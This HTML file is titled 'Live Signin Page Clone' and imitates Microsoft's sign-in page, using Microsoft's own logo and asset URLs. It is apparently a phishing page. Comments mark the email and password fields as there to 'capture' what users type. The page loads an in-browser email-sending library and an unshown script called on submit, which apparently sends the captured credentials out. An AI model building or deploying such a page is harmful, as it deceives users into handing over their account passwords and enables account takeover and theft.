<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Live Signin Page Clone</title>
</head>
<body>
    <div class="container">
        <form action="javascript:void(0)" method="POST"onsubmit="handlesubmit()">
            <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
            <div class="forms-container">
                <div class="forms">
                    <div class="first">
                        <h2>Sign in</h2>
                        <div class="form-group">
                            <!-- Add name attribute to capture email -->
                            <input type="email" name="email" placeholder="Email, Phone, or Skype" required>
                        </div>
                        <p>No account? <a href="#">Create One!</a></p>
                        <a href="#">Sign in with a security key <span>?</span></a>
                        <button type="button" class="next-btn">Next</button>
                    </div>
                    <div class="second">
                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
                        <h2>Enter password</h2>
                        <div class="form-group">
                            <!-- Add name attribute to capture password -->
                            <input type="password" name="password" placeholder="Password" required>
                        </div>
                        <a href="#">Forgot password?</a>
                        <!-- Change to type submit to send the form -->
                        <button type="submit">Sign in</button>
                    </div>
                </div>
            </div>
        </form>
        <div class="bottom">
            <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
            <span>Sign-in options</span>
        </div>
    </div>

    <script>
        const forms = document.querySelector('.forms')
        const next_button = document.querySelector('.next-btn')
        const arrow_btn = document.querySelector('.arrow-btn')

        const email_input = document.querySelector('.first input')
        const email_el = document.querySelector('.email')

        next_button.addEventListener('click', () => {
            forms.classList.add('next-form')
            email_el.innerText = email_input.value
            document.querySelector('.bottom').style.display = 'none'
        })
        arrow_btn.addEventListener('click', () => {
            forms.classList.remove('next-form')
            document.querySelector('.bottom').style.display = 'flex'
        })
    </script>

    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script src="script.js"></script>
</body>
</html>
